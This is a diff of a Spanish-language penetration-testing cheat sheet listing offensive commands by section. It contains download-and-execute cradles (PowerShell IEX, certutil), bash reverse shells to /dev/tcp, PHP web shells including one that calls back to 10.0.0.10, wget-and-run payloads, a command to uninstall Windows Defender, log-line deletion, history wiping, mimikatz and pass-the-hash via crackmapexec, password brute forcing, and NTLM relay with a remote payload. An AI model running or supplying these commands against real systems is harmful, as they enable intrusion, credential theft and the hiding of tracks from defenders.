@@ -9,9 +9,6 @@
 - [Firewall](#firewall)
 - [RDP](#rdp)
 - [Bash](#bash)
-- [History](#history)
-- [Iptables](#iptables)
-- [SSH](#ssh)
 - [Recon](#recon)
 - [Brute force](#bruteforcing)
 - [Samba](#samba)
@@ -24,16 +21,17 @@
 
 ---
 #### Powershell
-net user USUARIO PASSWORD /add --> *creación de usuario y contraseña*
+net user USUARIO PASSWORD /add --> **creación de usuario y contraseña**
 
-net localgroup administradores usuario /add --> *agrega "usuario" al grupo administradores*
+net localgroup administradores usuario /add --> **agrega "usuario" al grupo administradores**
 
-net share NOMBRE_COMPARTIDA C:\ /GRANT:SISTEMAS,FULL --> *comparte una carpeta ubicada en (C:\) y le concede todos los permisos de acceso al usuario SISTEMAS*
+net share NOMBRE_COMPARTIDA C:\ /GRANT:SISTEMAS,FULL --> **comparte una carpeta y le da FULL ACCESS al usuario**
 
-copy \\IP\SHARE\FILE FILE
+copy \\IP\SHARE\FILE FILE --> **copia de archivos**
 
-plink.exe -l USUARIO -pw PASSWORD -R port:127.0.0.1:port
+powershell.exe Uninstall-WindowsFeature -Name Windows-Defender --> **desinstalar defender**
 
+#### Descarga de archivos via Powershell
 powershell.exe -ep -Bypass -nop -noexit -c IEX"(New-Object Net.WebClient).downloadstring('http://ip/file')
 
 powershell.exe -c "(New-Object System.Net.Webclient).DownloadFile('http://ip/file', 'c:\Users\user\file')"
@@ -43,17 +41,7 @@ Invoke-WebRequest "http://ip/file" -OutFile "c:\Users\file"
 certutil.exe -f -urlcache -split http://ip/file file
 
 ---
-#### Creación de compartidas vía CLI
-$pass=convertto-securestring 'pass' -AsPlainText -Force
-
-$creds=New-Object System.Management.Automation.PSCredential('user', $pass)
-
-New-PSDrive -Name NAME -PSProvider FileSystem -Credential $creds -Root \\IP\COMPARTIDA
-
-cd COMPARTIDA:
-
----
-#### Firewall
+#### Firewall rules en Windows
 netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=in localport=PORT action=allow
 
 netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=out localport=PORT action=allow
@@ -68,143 +56,88 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnec
 
 ---
 #### Bash
-ln -s -f /dev/null .bash_history
-
-cat file | tr '[A-Z]' '[a-z]'
+cat file | tr '[A-Z]' '[a-z]' --> **convierte Mayusculas por Minusculas**
 
 cat file | grep ::: | awk -F: '{print $1":"$4}'
 
-cat file | grep -a string | awk '{print $2}' | awk -F@ '{print $1}'
+cat file | xclip -sel clip --> **copia el contenido del archivo en el portapapeles**
 
-cat file | xclip -sel clip
-
-cat file | sed 's/ /+/g'
+xclip -out -sel clip > file --> **pega lo que tenes en el clipboard en un archivo**
 
 cat nmap.grep | grep -oP '\d{1,5}/tcp.*'
 
-cat /proc/net/tcp | awk '{print $2}'| sort -u | grep -v "local" | awk '{print $2}' FS=':'
-
-find \-name *config*.php | xargs cat | grep -i -E "db-pass|db-user"
-
 find . -type d -exec touch {}/FILE \;
 
-find . -type d | while read DIRECTORY; do echo ${DIRECTORY} | grep php; done
+find . -type f -printf "%T+ %p\n" | sort --> **ordena archivos con timestamp**
 
 tr '\n' ',' < tplinkList.txt
 
-shuf -n 1 FILE --> *muestra palabras del archivo en forma aleatoria*
+paste -sd "," FILE --> **agrega una coma entre palabras**
 
-paste -sd "," FILE --> *agrega una coma entre palabras*
+head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo ' ' --> **generador de passwords**
 
-head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo ' ' --> *generador de passwords*
+sed -i '/192\.168\.0\.1/d' /var/log/messages.log --> **elimina todas las lineas que contienen la ip**
 
-sed -i '/192\.168\.0\.1/d' /var/log/messages.log --> *elimina todas las lineas que contienen la ip*
+arp-scan --interface INTERFACE ip/cidr --> **lista las MAC de la red**
 
-mkfifo input; tail -f input | /bin/sh 2>/dev/null > output
+rlwrap nc -lnvp PUERTO --> **abre un puerto y queda a la espera de conexiones**
 
-arp-scan --interface INTERFACE ip/cidr
+awk '{print "https://"$1}'
 
-arp-scan -q -l --interface INTERFACE | grep -i "MAC"
+ping -c ip -R --> **muestra ruta del ping hasta el destino**
 
-rlwrap nc -lnvp 'port'
+kill -9 $(jobs -p) --> **elimina los trabajos** 
 
-awk '{print "https://" $1}'
+touch {/folder1/,./}file.{exe,dll,txt} --> **crea multiples archivos**
 
-ping -c ip -R --> *muestra ruta del ping hasta el destino*
+xfreerdp /u:USUARIO /p:PASSWORD /size:1366x768 /f /v:10.16.22.103 --> **conexion remota via RDP**
 
-kill -9 $(jobs -p) 
+echo !:2-3 --> **rango de argumentos**
 
-touch {/folder1/,./}file.{exe,dll,txt}
+echo !? --> **estado de salida del último comando**
 
-xfreerdp /u:USUARIO /p:PASSWORD /size:1366x768 /f /v:10.16.22.103
+echo !$ --> **ultimo argumento**
 
-echo STRING | base64 -d | xxd -ps -r; echo
+echo !^ --> **primer argumento**
 
-echo !:2-3 --> *rango de argumentos*
-
-echo !? --> *estado de salida del último comando*
-
-echo !$ --> *ultimo argumento*
-
-echo !^ --> *primer argumento*
-
-echo !* --> *todos los argumentos*
+echo !* --> **todos los argumentos**
 
 curl -# --upload-file -F file=@FILE URL
 
-grep -oP '\[.*?\]' --> *quita los corchetes*
+grep -oP '\[.*?\]' --> **quita los corchetes**
 
-xclip -i FILE -selection clipboard
+dd if=FILE bs=1 skip=8 of=FILE.out --> **saca los primeros 8 bytes y deja el resto**
 
-dd if=FILE bs=1 skip=8 of=FILE.out --> *saca los primeros 8 bytes y deja el resto*
+dd if=FILE bs=1 count=8 of=FILE.out --> **solo deja los primeros 8 bytes**
 
-dd if=FILE bs=1 count=8 of=FILE.out --> *solo deja los primeros 8 bytes*
+read -n 5 -s -p "No podes poner mas de 5 caracteres" **#n=caracteres, s=silent(oculta el texto), p=prompt**
+
+read -t 10 --> **10 segundos para ingresar texto**
+
+#### copia de archivos entre hosts via netcat
+A> nc -lnvp 9001 < file
+
+V> cat > file < /dev/tcp/ip/9001
 
 ---
 #### Oneliners
-for i in admin dev test backup; do gobuster -u "url"/$i -w "wordlist" -t -o outputFile$i.txt; done
+for i in admin dev test backup; do gobuster -u "url"/$i -w "wordlist" -t -o outputFile$i.txt; done --> **bucle para enum directorios**
 
-for i in {1..20}; do curl http://192.168.46.5/users/$i 2>&1 | grep "s page</h1>" | cut -f2 -d '>' | cut -f1 -d \' ;done --> *enumeración de usuarios*
+for i in {1..20}; do curl http://ip/users/$i 2>&1 | grep "s page</h1>" | cut -f2 -d '>' | cut -f1 -d \' ;done -> **enumeración de usuarios**
 
-for i in $(seq 1 10); do ping -c 1 biblio-0$i; done
+for i in $(seq 1 10); do ping -c 1 biblio-0$i; done --> **ping sweep**
 
-for i in $(cat dictionario.lst); do echo $i; echo ${i}\!; done
-
-for x in port port port; do nmap -Pn --max-retries 0 -p $x ip; done
-
-while read SHAREDFOLDER; do echo "===${sharedFolder}==="; smbclient "//ip/${sharedFolder} -N -c dir; echo; done"
-
-while read line;do echo $line; done | xargs ls -l
-
----
-#### History
-export HISTTIMEFORMAT='%F %T '
-
-export HISTFILE=/dev/null
-
-shopt -s HISTAPPEND
-
----
-#### Iptables
-iptables -I DOCKER-USER -i INTERFACE -p tcp --dport "port" -j DROP --> *estado filtered* 
-
-iptables -A INPUT -i INTERFACE -p tcp --dport "port" -j REJECT --> *estado closed*
-
-iptables -A INPUT -i INTERFACE -p tcp --dport "port" -j REJECT --reject-with tcp-reset --> *estado closed y no aparece en logs*
-
-iptables -A INPUT -p tcp --dport 80 -j ACCEPT
-
-iptables -A INPUT -s 192.168.1.104 -j ACCEPT --> *acepta solo tráfico de la siguiente IP*
-
-iptables -A INPUT -s 192.168.1.102 -j DROP --> *bloquea tráfico de la siguiente IP*
-
-iptables -A INPUT -p ICMP -i eth0 -j DROP --> *bloqueo de ping en la interface*
-
----
-#### SSH
-ssh -R REMOTE_PORT:127.0.0.1:LOCAL_PORT user@REMOTE-IP -fNT --> *para no abrir tty en equipo remoto*
-
-ssh -L LOCAL_PORT:REMOTE_IP:REMOTE_PORT user@REMOTE-IP
+for x in port port port; do nmap -Pn --max-retries 0 -p $x ip; done --> **port knocker**
 
 ---
 #### Recon
-nmap -p- IP --reason --> *muestra información de escaneo* 
-
-nmap -top-ports 5000 --open -T5 -sU IP 
-
 nmap -p445 --scripts "vuln and safe" IP
 
 nmap --script smb-enum-share -p PORTS IP
  
-wpscan -e u,vp --url "http://ip" --proxy http://127.0.0.1:8080 
+wpscan --url "http://ip" --enumerate u 
 
-smbget -R smb://IP/FOLDER -U USER
-
-smbclient -N //IP -c "DIR"
-
-smbclient -L //IP -L
-
-smbclient -L //IP/FOLDER --option='client min protocol=NT1' -N
+smbget -R smb://ip/carpeta -U USER
 
 rpcclient -u '' -c "enumdomusers" -N
 
@@ -212,32 +145,26 @@ rpcclient -u '' -c "enumdomusers" -N
 #### Bruteforcing
 ncrack -vv -U "user.lst" -P "pass.lst" ip:port
 
-hydra -L "user.lst" -V -x '6:8aA1!@#$' ip ssh --> *hydra crea su diccionario para ataque con números, min+may, simbolos*
+hydra -L "user.lst" -V -x '6:8aA1!@#$' ip ssh --> **hydra crea su diccionario para ataque con números, min+may, simbolos**
 
-hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.179.73 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -vV
+hydra -l molly -P rockyou.txt 10.10.179.73 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -vV
 
 hashcat --examples-hashes | grep 'mode'
 
-hashcat --force --stdout diccionario -r /usr/share/hashcat/rules/best64.rule
-
-hashcat -m MODE -a 0 HASH diccionario --force -o FILE *a=fuerza bruta, o=archivo destino
+hashcat -m MODE -a 0 HASH diccionario --force -o FILE **a=fuerza bruta, o=archivo destino**
 
 zip2john ZIP > FILE.out
 
 fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt FILE.zip
 
-wfuzz -c -L --hc=404 -w WORDLIST TARGET --> *L=recursivo* 
+wfuzz -c -L --hc=404 -w WORDLIST TARGET --> **L=recursivo** 
 
 wfuzz -c --hc=404 -w WORDLIST -w WORDLIST2 url/FUZZ/FUZ2Z
 
-ffuf -c -w WORDLIST -u URL
-
-crunch 15 15 -t STRING+pattern --> *pattern @lowercase ,uppercase %numbers ^symbols*
+crunch 15 15 -t STRING+pattern --> **pattern @lowercase ,uppercase %numbers ^symbols**
 
 ---
 #### Samba
-crackmapexec smb ip --pass-pol -u 'user' -p 'pass'
-
 crackmapexec smb ip -u 'user' -p 'pass'
 
 crackmapexec smb ip -u 'user' -p 'pass' -M mimikatz
@@ -256,7 +183,7 @@ crackmapexec smb ip -u LIST -p PASS --continue-on-success
 
 crackmapexec smb ip -u DICT -p DICT
 
-impacket-smbserver testingSMB $(pwd) -smb2support -u USUARIO -p PASSWORD
+impacket-smbserver COMPARTIDA $(pwd) -smb2support -u USUARIO -p PASSWORD
 
 psexec.py 'user_ssh:pass_ssh'@'ip' "C:\plink.exe -batch -hostkey 'hostkey' -N -R 9090:127.0.0.1:3389 'IP_A' -P 1473 -l 'USUARIO' -pw 'PASSWORD_A'"
 
@@ -265,12 +192,6 @@ psexec.py 'user:pass@ip'
 psexec.py WORKGROUP/user:pass@ip CMD
 
 smbmap -H host -u 'null'
-
-smbcalcs //IP/COMPARTIDA carpeta -N 
-
-pth-winexe -U domain/user%pass //IP CMD
-
-pth-winexe -U domain/user%hash //IP CMD
 
 ---
 #### SAM Crack
@@ -288,19 +209,19 @@ pwdump system sam
 #### Python TTY 
 python -c 'import pty; pty.spawn("/bin/bash")'
 
-V>ctrl-Z --> *pone el proceso en background*
+V>ctrl-Z --> **pone el proceso en background**
 
 A>stty size
 
 A>stty raw -echo
 
-A>fg 1 --> *pone el proceso en primer plano*
+A>fg 1 --> **pone el proceso en foreground**
 
 V>stty row "x" cols "x"
 
 ---
 #### TTY 
-script /dev/null -c  bash
+script /dev/null -c bash
 
 bash -i >& /dev/tcp/ip/puerto 0>&1
 
@@ -312,21 +233,9 @@ mkfifo input; tail -f input | /bin/bash > output
 <?php system($_GET['cmd']);?>
 <?php system('ls -la');?>
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");
-<?php system("wget http://ip/file -o /tmp/file.php; php /tmp/file.php");?>
-<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";?>
+<?php system("wget http://ip/file -o /tmp/file.php; php /tmp/file.php"); ?>
+<?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
 ```
-
----
-#### Tmux
-tmux new -s "nombre"
-
-prefix + space --> *mueve los paneles*
-
-prefix + q --> *muestra los IDs de los paneles*
-
-prefix + x --> *cierra los paneles*
-
-prefix + ! --> *mueve el panel activo a una nueva ventana*
 
 ---
 #### Tmux copy mode 
@@ -342,7 +251,7 @@ prefix + ]
 #### Tmux search mode
 prefix + [
 
-ctrl + s *n=para busqueda, shift+n=busqueda reversa* 
+ctrl + s **n=para busqueda, shift+n=busqueda reversa** 
 
 ---
 #### Mysql
@@ -358,26 +267,6 @@ sqlmap -u URL --method POST --data "username=FUZZ&password=" -P username --dbs -
 
 ---
 ## Pentesting
-#### Responder
-python Responder.py -I INTERFACE -rdw  *para capturar Hashes NetNTLM-v2*
-
----
-#### CrackmapExec
-crackmapexec smb IP/CIDR -u 'USUARIO' -p 'PASSWORD'
-
-crackmapexec smb IP -u 'USUARIO' -p 'Password1' -x whoami
-
-crackmapexec smb IP -u 'USUARIO' -p 'Password1' --sam
-
-crackmapexec smb IP -u 'USUARIO' -H 'HASH'
-
-crackmapexec smb IP -u 'USUARIO' -H 'HASH' -M rdp -o action=enable
-
-crackmapexec smb IP -u 'Administrator' -p 'PASS' --ntds vss
-
-crackmapexec smb IP - u 'USUARIO' -p FILE
-
----
 #### PSexec
 python3 psexec.py DOMAIN/USER:PASS cmd.exe
 
@@ -389,9 +278,9 @@ pth-winexe -U DOMINIO/Administrator%HASH:HASH //IP cmd.exe
 
 ---
 #### Responder-ntlmrelayx
-responder.conf  *smb OFF + http OFF*
+responder.conf  **smb OFF + http OFF**
 
-targets.txt  *agregamos las ips de destino*
+crear un archivo con los targets >> targets.txt  
 
 python3 ntlmrelayx.py -tf targets.txt -smb2support
 
@@ -404,5 +293,15 @@ python3 ntlmrelayx.py -tf targets.txt -c "certutil.exe -f -urlcache -split IP:PU
 python Responder.py -I INTERFACE -rdw
 
 python -m SimpleHTTPServer
+
+---
+#### Arp discovery
+arping -c 1 -I enp5s0 ip/mask
+
+arp-scan -I enp5s0 ip/mask
+
+masscan --arp ip/mask > file
+
+sudo nmap -RP ip
 
 - [Inicio](#Ayuda-memoria)
